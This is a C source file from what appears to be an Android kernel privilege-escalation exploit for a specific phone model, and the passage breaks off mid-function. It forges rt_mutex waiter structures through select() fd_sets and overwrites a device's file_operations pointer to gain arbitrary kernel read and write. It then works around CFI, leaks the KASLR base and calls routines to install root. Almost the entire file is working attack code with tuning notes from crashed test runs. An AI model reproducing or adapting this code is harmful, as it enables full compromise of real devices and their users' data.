#include "common.h"
#include "runtime_struct_offsets.h"
#include <time.h>
static double fops_elapsed_ms(struct timespec *ref) {
  struct timespec now;
  clock_gettime(CLOCK_MONOTONIC, &now);
  return (now.tv_sec - ref->tv_sec) * 1000.0 + (now.tv_nsec - ref->tv_nsec) / 1e6;
}
extern int pselect_custom_write;

#define PSELECT_CFI_ROUTE_ATTEMPTS 8
#define PSELECT_EXPECTED_READY 9

atomic_int cfi_stage_done;
ssize_t cfi_write_ret = -1;
ssize_t cfi_read_ret = -1;
ssize_t cfi_read_slot_ret = -1;
ssize_t cfi_owner_ret = -1;
ssize_t cfi_restore_ret = -1;
uint64_t fops_before;
uint64_t fops_after;
int cfi_attempts;
int pipe_stage_attempts;
int cfi_dirty_seen;
int cfi_last_step;
int cfi_last_errno;
int kaslr_done;
int kaslr_step;
uint64_t kaslr_fops_alias;
uint64_t kaslr_open_ptr;
uint64_t kaslr_ioctl_ptr;
uint64_t kaslr_mmap_ptr;
uint64_t kaslr_release_ptr;
uint64_t kaslr_show_fdinfo_ptr;
uint64_t kaslr_base;
uint64_t kaslr_slide;
uint64_t kaslr_expected_ioctl;
uint64_t kaslr_expected_mmap;
uint64_t kaslr_expected_release;
uint64_t kaslr_expected_show_fdinfo;
uint64_t slide_bootid_before;
uint64_t slide_bootid_after;
uint64_t slide_bootid_want;
ssize_t slide_bootid_restore_ret = -1;

static int route_delay_usec(int attempt) {
  /*
   * CRITICAL (CPH2521): mode4 used to force delay=0 so the consumer punched
   * sched_setattr/FUTEX immediately as select entered → softboot race.
   * NO_CONSUMER survives; full path with delay=0 softboots.
   * Default: staggered ≥50ms; override with PSELECT_ROUTE_DELAY_USEC=N.
   */
  int override = env_int_range("PSELECT_ROUTE_DELAY_USEC", -1, -1, 1000000);
  if (override >= 0)
    return override;

  static const int delays[] = {
    50000, 80000, 100000, 120000, 150000, 30000, 200000, 70000,
  };
  int count = (int)(sizeof(delays) / sizeof(delays[0]));
  return delays[(attempt - 1) % count];
}

void fdset_put_word(fd_set *set, int word, uint64_t value) {
  unsigned long *bits = (unsigned long *)set;
  bits[word] = (unsigned long)value;
}

uint64_t fdset_get_word(const fd_set *set, int word) {
  const unsigned long *bits = (const unsigned long *)set;
  return bits[word];
}

static int pselect_words_per_set(void) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (PSELECT_ROUTE_NFDS + bits_per_word - 1) / bits_per_word;
}

static int pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

static void pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, uint64_t value, const char *name) {
  int shift = env_int_range("PSELECT_SHIFT", PSELECT_WAITER_WORD_SHIFT, -14, 14);
  int global_word = shift + waiter_word;
  int placed = pselect_put_global_word(
      in, out, ex, words_per_set, global_word, value);
  if (!placed) {
    pr_warning("pselect cannot place %s waiter_word=%d global_word=%d "
               "words_per_set=%d nfds=%d\n",
               name, waiter_word, global_word, words_per_set,
               PSELECT_ROUTE_NFDS);
  }
}

void open_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd) {
  (void)write_fd;

  int high_read = fcntl(read_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
  if (high_read < 0) {
    pr_warning("pselect F_DUPFD read errno=%d\n", errno);
    return;
  }
  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(high_read, fd);
    }
  }
  close(high_read);
  dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
  FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
}

void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  if (env_flag("PSELECT_SIMPLE_LAYOUT", 0)) {
    uint64_t it_off = (active_offsets && active_offsets->off_init_task)
                          ? active_offsets->off_init_task
                          : INIT_TASK_OFF;
    uint64_t it = data_addr(KIMAGE_TEXT_BASE + it_off);
    fdset_put_word(in, 0, fake_w0);
    fdset_put_word(in, 3, 0);
    fdset_put_word(ex, 0,
                   pselect_custom_write_enabled() ? fake_task : it);
    fdset_put_word(ex, 1, fake_lock);
    fdset_put_word(ex, 2, 3);
    fdset_put_word(ex, 3, 0);
    return;
  }

  int words_per_set = pselect_words_per_set();
  struct pselect_waiter_word {
    int word;
    uint64_t value;
    const char *name;
  };
  /*
   * waiter_word N is placed at stack word (PSELECT_SHIFT + N).
   * With default Ace layout, waiter base sits at word 2, so field at
   * struct offset O is waiter_word = 2 + O/8.
   *
   * 6.12 rt_waiter_node: task@0x50 lock@0x58 → words 12/13
   * 5.10 plain rb_node:  task@0x30 lock@0x38 → words 8/9
   *   (Quest IonStack / CPH2521 disasm)
   */
#ifdef GHOSTLOCK_KERNEL_5_10
  /*
   * CPH2521 lessons:
   *  - Full stack MAIN-tree write gadget (parent=fake_fops,right=MISC) softboots
   *    at select (tree walks treat MISC as rb_node).
   *  - Stack PI-only gadget survived but cfi errno=22 (write not committed).
   *  - IonStack/A155N FOPS use SIMPLE pselect (in0=fake_w0, ex=task/lock/wake)
   *    + heap W0 pi_tree write; pi_waiters=0 on fake_task.
   *
   * Mode4 default: IonStack simple layout (or PSELECT_SIMPLE_LAYOUT=1).
   * Non-mode4 / MODE4_FULL_STACK=1: full 5.10 waiter words with PI gadget only
   * (main tree parent=1,0,0 — never put MISC on main tree).
   */
  {
    uint64_t init_task_off =
        (active_offsets && active_offsets->off_init_task)
            ? active_offsets->off_init_task
            : INIT_TASK_OFF;
    /* Must be P0 data alias — raw KIMAGE VA softboots when walked as task. */
    uint64_t init_task = data_addr(KIMAGE_TEXT_BASE + init_task_off);
    /* CPH2521: IonStack SIMPLE softboots at pselect; full-stack PI survived
     * to CFI probe. Default FULL stack; set MODE4_SIMPLE=1 to force simple. */
    int use_simple = env_flag("PSELECT_SIMPLE_LAYOUT", 0) ||
                     env_flag("MODE4_SIMPLE", 0);
    if (use_simple) {
      /* IonStack / Root-My-Galaxy FOPS pselect shape */
      fdset_put_word(in, 0, fake_w0);
      fdset_put_word(in, 1, 0);
      fdset_put_word(in, 2, 0);
      fdset_put_word(in, 3, 0);
      fdset_put_word(ex, 0, init_task);
      fdset_put_word(ex, 1, fake_lock);
      fdset_put_word(ex, 2, 3);
      fdset_put_word(ex, 3, 0);
      pr_info("stack mode4 SIMPLE in0=fake_w0 ex0=%016llx(init_task_p0) "
              "ex1=fake_lock ex2=3 (heap W0 pi write)\n",
              (unsigned long long)init_task);
    } else {
      uint64_t pi_parent = 0, pi_right = 0, pi_left = 0;
      uint64_t stack_task = init_task;
      if (pselect_custom_write == 4 && fake_fops) {
        uint64_t misc_off =
            (active_offsets && active_offsets->off_ashmem_misc_fops)
                ? active_offsets->off_ashmem_misc_fops
                : ASHMEM_MISC_FOPS_OFF;
        uint64_t misc = data_addr(KIMAGE_TEXT_BASE + misc_off);
        /*
         * GLM review: rb_link_node clobbers stack waiter tree/pi fields after
         * requeue insert — stack cannot hold the write gadget. Keep stack PI
         * clean (0,0,0); write lives on heap W0 + pi_waiters (util.c).
         * MODE4_STACK_PI=1 re-enables stack inverted (historical softboot).
         */
        uint64_t tree_pc = 0, tree_r = 0, tree_l = 0; /* proven safe */
        stack_task = init_task;
        if (env_flag("MODE4_TASK_FAKE", 0))
          stack_task = fake_task;
        if (env_flag("MODE4_STACK_PI", 0) && !env_flag("MODE4_NO_GADGET", 0)) {
          pi_parent = fake_fops & ~3ULL;
          pi_right = misc;
          pi_left = 0;
        } else {
          pi_parent = 0;
          pi_right = 0;
          pi_left = 0;
        }
        pr_info("stack mode4 main=0,0,0 task=%s lock=fake_lock "
                "pi parent=%016llx right=%016llx left=%016llx "
                "(%s; heap W0 inert by default; pi_waiters=0)\n",
                (stack_task == fake_task) ? "fake_task" : "init_task",
                (unsigned long long)pi_parent,
                (unsigned long long)pi_right,
                (unsigned long long)pi_left,
                env_flag("MODE4_STACK_PI", 0) ? "stack inverted" : "stack clean");
        /* use tree_pc in words below */
        struct pselect_waiter_word words[] = {
          {2, tree_pc, "tree_pc"},
          {3, tree_r, "tree_right"},
          {4, tree_l, "tree_left"},
          {5, pi_parent, "pi_parent"},
          {6, pi_right, "pi_right"},
          {7, pi_left, "pi_left"},
          {8, stack_task, "task"},
          {9, fake_lock, "lock"},
          {10, 1, "prio"},
          {11, 0, "deadline"},
        };
        for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
          struct pselect_waiter_word *w = &words[i];
          pselect_put_waiter_word(
              in, out, ex, words_per_set, w->word, w->value, w->name);
        }
        goto stack_words_done;
      } else if (pselect_custom_write_enabled()) {
        stack_task = fake_task;
      }
      struct pselect_waiter_word words[] = {
        {2, 0, "tree_pc"},
        {3, 0, "tree_right"},
        {4, 0, "tree_left"},
        {5, pi_parent, "pi_parent"},
        {6, pi_right, "pi_right"},
        {7, pi_left, "pi_left"},
        {8, stack_task, "task"},
        {9, fake_lock, "lock"},
        {10, 1, "prio"},
        {11, 0, "deadline"},
      };
      for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
        struct pselect_waiter_word *w = &words[i];
        pselect_put_waiter_word(
            in, out, ex, words_per_set, w->word, w->value, w->name);
      }
    stack_words_done:;
    }
  }
#else
  {
  struct pselect_waiter_word words[] = {
    {2, 0, "tree_pc"},
    {3, 0, "tree_right"},
    {4, 0, "tree_left"},
    {5, 1, "tree_prio"},
    {6, 0, "tree_deadline"},
    {7, 0, "pi_parent"},
    {8, 0, "pi_right"},
    {9, 0, "pi_left"},
    {10, 1, "pi_prio"},
    {11, 0, "pi_deadline"},
    {12, pselect_custom_write_enabled() ? fake_task : text_addr(INIT_TASK),
     "task"},
    {13, fake_lock, "lock"},
    {14, 3, "wake_state"},
  };
  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
    struct pselect_waiter_word *w = &words[i];
    pselect_put_waiter_word(
        in, out, ex, words_per_set, w->word, w->value, w->name);
  }
  }
#endif
}

void do_pselect_fake_lock_route(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    cfi_last_step = 30;
    cfi_last_errno = 0;
    pr_error("pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return;
  }

  struct timespec route_t0;
  clock_gettime(CLOCK_MONOTONIC, &route_t0);
  int calls = 0;
  int success = 0;
  int route_verified = 0;
  for (int route_attempt = 1; route_attempt <= PSELECT_CFI_ROUTE_ATTEMPTS;
       route_attempt++) {
    if (route_attempt != 1) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      if (!page_base || !fake_lock || !fake_fops) {
        cfi_last_step = 34;
        cfi_last_errno = errno;
        pr_error("pselect retry page prepare failed attempt=%d base=%016zx "
                 "lock=%016zx fops=%016zx\n",
                 route_attempt, page_base, fake_lock, fake_fops);
        break;
      }
    }

    int pipefd[2];
    SYSCHK(pipe(pipefd));
    int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
    if (block_fd < 0) {
      pr_warning("pselect timerfd_create failed errno=%d; using pipe read end\n",
                 errno);
      block_fd = pipefd[0];
    }
    int high_read = fcntl(block_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 16);
    if (high_read < 0) {
      cfi_last_step = 31;
      cfi_last_errno = errno;
      pr_error("pselect F_DUPFD read errno=%d\n", errno);
      if (block_fd != pipefd[0]) {
        close(block_fd);
      }
      close(pipefd[0]);
      close(pipefd[1]);
      break;
    }

    fd_set in;
    fd_set out;
    fd_set ex;
    prepare_pselect_fdsets(&in, &out, &ex);
    /*
     * Placement audit (nfds=320 → words_per_set=5 on aarch64):
     * shift + waiter_word → set/index. With default shift=-2:
     *   tree@w2→in[0], pi@w5→in[3], task@w8→out[1], lock@w9→out[2]
     * Old logs only printed in0/in3/out0/ex* and missed lock/task.
     */
    {
      int wps = pselect_words_per_set();
      int sh = env_int_range("PSELECT_SHIFT", PSELECT_WAITER_WORD_SHIFT, -14, 14);
      pr_info("pselect route setup attempt=%d simple=%d shift=%d wps=%d "
              "page=%016zx fake_lock=%016zx fake_w0=%016zx fake_task=%016zx\n",
              route_attempt,
              env_flag("PSELECT_SIMPLE_LAYOUT", 0), sh, wps,
              page_base, fake_lock, fake_w0, fake_task);
      pr_info("pselect place tree=%016llx pi=%016llx task=%016llx lock=%016llx "
              "prio=%016llx (expect task≈init/fake lock≈fake_lock)\n",
              (unsigned long long)fdset_get_word(&in, 0),
              (unsigned long long)fdset_get_word(&in, 3),
              (unsigned long long)fdset_get_word(&out, 1),
              (unsigned long long)fdset_get_word(&out, 2),
              (unsigned long long)fdset_get_word(&out, 3));
      if (sh == -2 && wps == 5) {
        uint64_t got_lock = fdset_get_word(&out, 2);
        uint64_t got_task = fdset_get_word(&out, 1);
        if (got_lock != (uint64_t)fake_lock)
          pr_warning("pselect LOCK MISPLACE got=%016llx want=%016zx "
                     "(overlay misaligned → softboot risk)\n",
                     (unsigned long long)got_lock, fake_lock);
        if (got_task == 0)
          pr_warning("pselect TASK MISPLACE got=0 (overlay misaligned)\n");
      }
    }
    fflush(stdout);
    fsync(STDOUT_FILENO);
    {
      int sfd = open("/storage/emulated/0/ghostlock_logs/stage.txt",
                     O_WRONLY | O_CREAT | O_APPEND, 0644);
      if (sfd >= 0) {
        char buf[128];
        int n = snprintf(buf, sizeof(buf),
                         "pselect_setup attempt=%d shift=%d\n", route_attempt,
                         env_int_range("PSELECT_SHIFT", PSELECT_WAITER_WORD_SHIFT,
                                       -14, 14));
        if (n > 0) (void)write(sfd, buf, (size_t)n);
        fsync(sfd);
        close(sfd);
      }
    }
    open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);

    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
    int delay_usec = route_delay_usec(route_attempt);
    atomic_store(&main_route_delay_usec, delay_usec);
    /*
     * MODE4_NO_CONSUMER=1: do not punch sched_setattr/FUTEX during select.
     * Isolates softboot in select overlay alone vs consumer×owner race.
     * Route success will stay 0; goal is survive select.
     */
    if (env_flag("MODE4_NO_CONSUMER", 0)) {
      atomic_store(&punch_consume_go, 0);
      pr_info("pselect NO_CONSUMER=1 (no sched_setattr punch; survive-test)\n");
    } else {
      atomic_store(&punch_consume_go, route_attempt);
    }

    struct timeval timeout = {
      .tv_sec = PSELECT_TIMEOUT_SEC,
#ifdef PSELECT_TIMEOUT_USEC
      .tv_usec = PSELECT_TIMEOUT_USEC,
#else
      .tv_usec = 0,
#endif
    };

    pr_info("pselect pre-select +%.0fms\n", fops_elapsed_ms(&route_t0));
    fflush(stdout);
    fsync(STDOUT_FILENO);
    {
      int sfd = open("/storage/emulated/0/ghostlock_logs/stage.txt",
                     O_WRONLY | O_CREAT | O_APPEND, 0644);
      if (sfd >= 0) {
        const char *m = "pselect_pre_select\n";
        (void)write(sfd, m, strlen(m));
        fsync(sfd);
        close(sfd);
      }
    }
    errno = 0;
    int ret = select(PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout);
    int saved_errno = errno;
    pr_info("pselect post-select +%.0fms ret=%d\n", fops_elapsed_ms(&route_t0), ret);
    {
      int sfd = open("/storage/emulated/0/ghostlock_logs/stage.txt",
                     O_WRONLY | O_CREAT | O_APPEND, 0644);
      if (sfd >= 0) {
        char buf[64];
        int n = snprintf(buf, sizeof(buf), "pselect_post_select ret=%d\n", ret);
        if (n > 0) (void)write(sfd, buf, (size_t)n);
        fsync(sfd);
        close(sfd);
      }
    }
    atomic_store(&punch_consume_go, 0);
    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);
    pr_info("pselect returned attempt=%d ret=%d errno=%d calls=%d success=%d delay=%d\n",
            route_attempt, ret, saved_errno, calls, success, delay_usec);

    int route_quality_miss = 0;
    int route_signal = calls > 0 && success > 0;
    int cfi_probed = 0;
    if (route_signal) {
      cfi_probed = 1;
      if (ret != PSELECT_EXPECTED_READY) {
        pr_info("pselect route probing cfi attempt=%d ret=%d expected=%d\n",
                route_attempt, ret, PSELECT_EXPECTED_READY);
      }
      if (pselect_custom_write_enabled()) {
        cfi_last_step = 0;
        cfi_last_errno = 0;
        route_verified = 1;
        if (active_offsets && active_offsets->off_system_unbound_wq &&
            !root_child_done) {
          try_cfi_stage();
        }
      } else if (try_cfi_stage()) {
        cfi_last_step = 0;
        route_verified = 1;
      } else if (!cfi_last_step) {
        cfi_last_step = 32;
      }
    }
    if (!route_verified && route_signal) {
      route_quality_miss = 1;
      if (!cfi_probed) {
        cfi_last_step = 35;
        cfi_last_errno = saved_errno;
      }
      pr_info("pselect route quality miss attempt=%d/%d ret=%d expected=%d delay=%d; refreshing FOPS page\n",
              route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, ret,
              PSELECT_EXPECTED_READY, delay_usec);
    } else if (!route_verified) {
      cfi_last_step = 33;
      cfi_last_errno = saved_errno;
    }

    close(high_read);
    if (block_fd != pipefd[0]) {
      close(block_fd);
    }
    close(pipefd[0]);
    close(pipefd[1]);

    if (route_quality_miss) {
      continue;
    }
    if (route_verified || cfi_dirty_seen || cfi_last_step != 1) {
      break;
    }
    pr_info("pselect cfi write miss attempt=%d/%d errno=%d; refreshing FOPS page\n",
            route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, cfi_last_errno);
  }
  pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
          calls, success, cfi_last_step, cfi_last_errno);
}

int repair_fake_fops_llseek(int fd) {
  /* Prefer runtime CFI JT offset (CPH2521); fall back to target.h. */
  uint64_t llseek_off = (active_offsets && active_offsets->off_noop_llseek)
                            ? active_offsets->off_noop_llseek
                            : NOOP_LLSEEK_OFF;
  uint64_t llseek = text_addr(KIMAGE_TEXT_BASE + llseek_off);
  uint64_t after = 0;
  uintptr_t slot = fake_fops + FOPS_LLSEEK_OFF;
  ssize_t wr = configfs_write_once(fd, slot, &llseek, sizeof(llseek));
  ssize_t rd = configfs_read_once(fd, slot, &after, sizeof(after));
  return wr == (ssize_t)sizeof(llseek) &&
         rd == (ssize_t)sizeof(after) &&
         after == llseek;
}

static uint64_t fops_runtime_off(uint64_t table_off, uint64_t fallback_off) {
  if (active_offsets && table_off)
    return table_off;
  return fallback_off;
}

static uintptr_t fops_runtime_text(uint64_t table_off, uint64_t fallback_off) {
  return text_addr(KIMAGE_TEXT_BASE + fops_runtime_off(table_off, fallback_off));
}

/* Image VA for a table field (multi-TU safe; never use target.h *_OFF alone). */
static uintptr_t fops_image_sym(uint64_t table_off, uint64_t fallback_off) {
  return KIMAGE_TEXT_BASE + fops_runtime_off(table_off, fallback_off);
}

static uintptr_t fops_data_sym(uint64_t table_off, uint64_t fallback_off) {
  return data_addr(fops_image_sym(table_off, fallback_off));
}

int refresh_fake_fops_text(int fd) {
  uint64_t a_ioctl = active_offsets ? active_offsets->off_ashmem_ioctl : 0;
  uint64_t a_compat = active_offsets ? active_offsets->off_ashmem_compat_ioctl : 0;
  uint64_t a_mmap = active_offsets ? active_offsets->off_ashmem_mmap : 0;
  uint64_t a_open = active_offsets ? active_offsets->off_ashmem_open : 0;
  uint64_t a_rel = active_offsets ? active_offsets->off_ashmem_release : 0;
  uint64_t a_fdinfo = active_offsets ? active_offsets->off_ashmem_show_fdinfo : 0;
  uint64_t a_cfg_r = active_offsets ? active_offsets->off_configfs_read_iter : 0;
  uint64_t a_cfg_w = active_offsets ? active_offsets->off_configfs_bin_write_iter : 0;
  uint64_t a_splice = active_offsets ? active_offsets->off_copy_splice_read : 0;

  struct fops_slot {
    size_t off;
    uint64_t value;
  };
#ifdef GHOSTLOCK_KERNEL_5_10
  struct fops_slot slots[] = {
    {FOPS_READ_OFF, fops_runtime_text(a_cfg_r, CONFIGFS_READ_ITER_OFF)},
    {FOPS_WRITE_OFF, fops_runtime_text(a_cfg_w, CONFIGFS_BIN_WRITE_ITER_OFF)},
    {FOPS_IOCTL_OFF, fops_runtime_text(a_ioctl, ASHMEM_IOCTL_OFF)},
    {FOPS_COMPAT_IOCTL_OFF, fops_runtime_text(a_compat, ASHMEM_COMPAT_IOCTL_OFF)},
    {FOPS_MMAP_OFF, fops_runtime_text(a_mmap, ASHMEM_MMAP_OFF)},
    {FOPS_OPEN_OFF, fops_runtime_text(a_open, ASHMEM_OPEN_OFF)},
    {FOPS_RELEASE_OFF, fops_runtime_text(a_rel, ASHMEM_RELEASE_OFF)},
    {FOPS_SPLICE_READ_OFF, fops_runtime_text(a_splice, COPY_SPLICE_READ_OFF)},
    {FOPS_SHOW_FDINFO_OFF, fops_runtime_text(a_fdinfo, ASHMEM_SHOW_FDINFO_OFF)},
  };
#else
  struct fops_slot slots[] = {
    {FOPS_READ_ITER_OFF, fops_runtime_text(a_cfg_r, CONFIGFS_READ_ITER_OFF)},
    {FOPS_WRITE_ITER_OFF, fops_runtime_text(a_cfg_w, CONFIGFS_BIN_WRITE_ITER_OFF)},
    {FOPS_IOCTL_OFF, fops_runtime_text(a_ioctl, ASHMEM_IOCTL_OFF)},
    {FOPS_COMPAT_IOCTL_OFF, fops_runtime_text(a_compat, ASHMEM_COMPAT_IOCTL_OFF)},
    {FOPS_MMAP_OFF, fops_runtime_text(a_mmap, ASHMEM_MMAP_OFF)},
    {FOPS_OPEN_OFF, fops_runtime_text(a_open, ASHMEM_OPEN_OFF)},
    {FOPS_RELEASE_OFF, fops_runtime_text(a_rel, ASHMEM_RELEASE_OFF)},
    {FOPS_SPLICE_READ_OFF, fops_runtime_text(a_splice, COPY_SPLICE_READ_OFF)},
    {FOPS_SHOW_FDINFO_OFF, fops_runtime_text(a_fdinfo, ASHMEM_SHOW_FDINFO_OFF)},
  };
#endif

  for (size_t i = 0; i < sizeof(slots) / sizeof(slots[0]); i++) {
    uintptr_t target = fake_fops + slots[i].off;
    if (kernel_write_data(fd, target, &slots[i].value,
        sizeof(slots[i].value)) !=
        (ssize_t)sizeof(slots[i].value)) {
      return 0;
    }
  }
  return 1;
}

int leak_kernel_base(int fd) {
  uint64_t a_fops = active_offsets ? active_offsets->off_ashmem_fops : 0;
  uint64_t a_open = active_offsets ? active_offsets->off_ashmem_open : 0;
  uint64_t a_ioctl = active_offsets ? active_offsets->off_ashmem_ioctl : 0;
  uint64_t a_mmap = active_offsets ? active_offsets->off_ashmem_mmap : 0;
  uint64_t a_rel = active_offsets ? active_offsets->off_ashmem_release : 0;
  uint64_t a_fdinfo = active_offsets ? active_offsets->off_ashmem_show_fdinfo : 0;

  kaslr_fops_alias = fops_data_sym(a_fops, ASHMEM_FOPS_OFF);
  kaslr_open_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_OPEN_OFF);
  kaslr_ioctl_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_IOCTL_OFF);
  kaslr_mmap_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_MMAP_OFF);
  kaslr_release_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_RELEASE_OFF);
  kaslr_show_fdinfo_ptr =
    kernel_read64(fd, kaslr_fops_alias + FOPS_SHOW_FDINFO_OFF);

  if (!is_kernel_ptr(kaslr_open_ptr) || !is_kernel_ptr(kaslr_ioctl_ptr) ||
      !is_kernel_ptr(kaslr_mmap_ptr) || !is_kernel_ptr(kaslr_release_ptr) ||
      !is_kernel_ptr(kaslr_show_fdinfo_ptr)) {
    kaslr_step = 1;
    return 0;
  }

  /* open_ptr is a CFI JT on CPH2521; open off must be JT off too */
  kaslr_base = kaslr_open_ptr - fops_runtime_off(a_open, ASHMEM_OPEN_OFF);
  kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
  kaslr_done = 1;
  kaslr_expected_ioctl = fops_runtime_text(a_ioctl, ASHMEM_IOCTL_OFF);
  kaslr_expected_mmap = fops_runtime_text(a_mmap, ASHMEM_MMAP_OFF);
  kaslr_expected_release = fops_runtime_text(a_rel, ASHMEM_RELEASE_OFF);
  kaslr_expected_show_fdinfo = fops_runtime_text(a_fdinfo, ASHMEM_SHOW_FDINFO_OFF);

  if (kaslr_ioctl_ptr != kaslr_expected_ioctl ||
      kaslr_mmap_ptr != kaslr_expected_mmap ||
      kaslr_release_ptr != kaslr_expected_release ||
      kaslr_show_fdinfo_ptr != kaslr_expected_show_fdinfo) {
    kaslr_done = 0;
    kaslr_step = 2;
    return 0;
  }

  if (!refresh_fake_fops_text(fd)) {
    kaslr_done = 0;
    kaslr_step = 3;
    return 0;
  }

  kaslr_step = 0;
  return 1;
}

int restore_slide_boot_id(int fd) {
  uintptr_t boot_id_data = SLIDE_RANDOM_BOOT_ID_DATA;
  slide_bootid_want = slide_canon_addr(SLIDE_SYSCTL_BOOTID);
  configfs_read_once(
      fd, boot_id_data, &slide_bootid_before, sizeof(slide_bootid_before));
  slide_bootid_restore_ret =
    configfs_write_once(
        fd, boot_id_data, &slide_bootid_want, sizeof(slide_bootid_want));
  configfs_read_once(
      fd, boot_id_data, &slide_bootid_after, sizeof(slide_bootid_after));
  pr_info("slide restore boot_id data pid=%d ret=%zd before=%016llx "
          "want=%016llx after=%016llx errno=%d\n",
          getpid(), slide_bootid_restore_ret,
          (unsigned long long)slide_bootid_before,
          (unsigned long long)slide_bootid_want,
          (unsigned long long)slide_bootid_after, errno);
  return slide_bootid_restore_ret == (ssize_t)sizeof(slide_bootid_want) &&
         slide_bootid_after == slide_bootid_want;
}

int install_child_root(int fd) {
  if (!install_pipe_physrw(fd)) return 0;
  if (install_umh_root(fd)) return 1;
  return install_android_root(fd);
}

int try_cfi_stage(void) {
  cfi_attempts++;
  int fd = open_ashmem_device();
  int dirty = 0;
  int can_read_back = 0;

  if (fd < 0) {
    cfi_last_step = 11;
    cfi_last_errno = errno;
    pr_info("cfi open failed path=%s errno=%d\n", ashmem_path, errno);
    return 0;
  }

  uint64_t a_ioctl = active_offsets ? active_offsets->off_ashmem_ioctl : 0;
  uint64_t a_open = active_offsets ? active_offsets->off_ashmem_open : 0;
  uint64_t a_cfg_w = active_offsets ? active_offsets->off_configfs_bin_write_iter : 0;
  uint64_t a_misc = active_offsets ? active_offsets->off_ashmem_misc_fops : 0;
  uint64_t a_fops = active_offsets ? active_offsets->off_ashmem_fops : 0;

  pr_info("cfi attempt=%d fd=%d path=%s fake_fops=%016zx target=%016zx "
          "ioctl=%016llx open=%016llx write_iter=%016llx\n",
          cfi_attempts, fd, ashmem_path, fake_fops, binwrite_target,
          (unsigned long long)fops_runtime_text(a_ioctl, ASHMEM_IOCTL_OFF),
          (unsigned long long)fops_runtime_text(a_open, ASHMEM_OPEN_OFF),
          (unsigned long long)fops_runtime_text(a_cfg_w, CONFIGFS_BIN_WRITE_ITER_OFF));

  uintptr_t misc_fops = fops_data_sym(a_misc, ASHMEM_MISC_FOPS_OFF);
  char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
  ssize_t n =
    configfs_write_once(fd, binwrite_target, payload, sizeof(payload));
  cfi_write_ret = n;
  pr_info("cfi write ret=%zd errno=%d\n", n, errno);
  if (n != (ssize_t)sizeof(payload)) {
    cfi_last_step = 1;
    cfi_last_errno = errno;
    goto fail;
  }
  dirty = 1;
  cfi_dirty_seen = 1;

  if (!repair_fake_fops_llseek(fd)) {
    cfi_last_step = 2;
    cfi_last_errno = errno;
    goto fail;
  }
  cfi_read_slot_ret = sizeof(uint64_t);
  can_read_back = 1;

  char readback[sizeof(payload)];
  memset(readback, 0, sizeof(readback));
  ssize_t r =
    configfs_read_once(fd, binwrite_target, readback, sizeof(readback));
  cfi_read_ret = r;
  pr_info("cfi read ret=%zd errno=%d\n", r, errno);
  if (r != (ssize_t)sizeof(readback) ||
      memcmp(readback, payload, sizeof(payload)) != 0) {
    cfi_last_step = 3;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t before = 0;
  ssize_t rb = configfs_read_once(fd, misc_fops, &before, sizeof(before));
  fops_before = before;
  pr_info("cfi fops_before ret=%zd value=%016llx want=%016zx errno=%d\n",
          rb, (unsigned long long)before, fake_fops, errno);
  if (rb != (ssize_t)sizeof(before) || before != fake_fops) {
    cfi_last_step = 4;
    cfi_last_errno = errno;
    goto fail;
  }

  if (!restore_slide_boot_id(fd)) {
    cfi_last_step = 10;
    cfi_last_errno = errno;
    goto fail;
  }

  if (!leak_kernel_base(fd)) {
    cfi_last_step = 9;
    cfi_last_errno = errno;
    goto fail;
  }

  int installed = 0;
  pipe_stage_attempts = 0;
  for (int attempt = 0; attempt < PIPE_MAX_ATTEMPTS; attempt++) {
    pipe_stage_attempts++;
    if (attempt != 0) {
      reset_pipe_attempt();
    }
    if (install_child_root(fd)) {
      installed = 1;
      break;
    }
    if (pipe_cache_gate_ok && physrw_read_ok && physrw_write_ok &&
        physrw_read64_ok && physrw_write64_ok) {
      break;
    }
  }

  if (!installed) {
    cfi_last_step = 8;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t original_fops = canon_addr(fops_image_sym(a_fops, ASHMEM_FOPS_OFF));
  ssize_t restore = configfs_write_once(
      fd, misc_fops, &original_fops, sizeof(original_fops));
  cfi_restore_ret = restore;
  if (restore != (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 5;
    cfi_last_errno = errno;
    goto fail;
  }

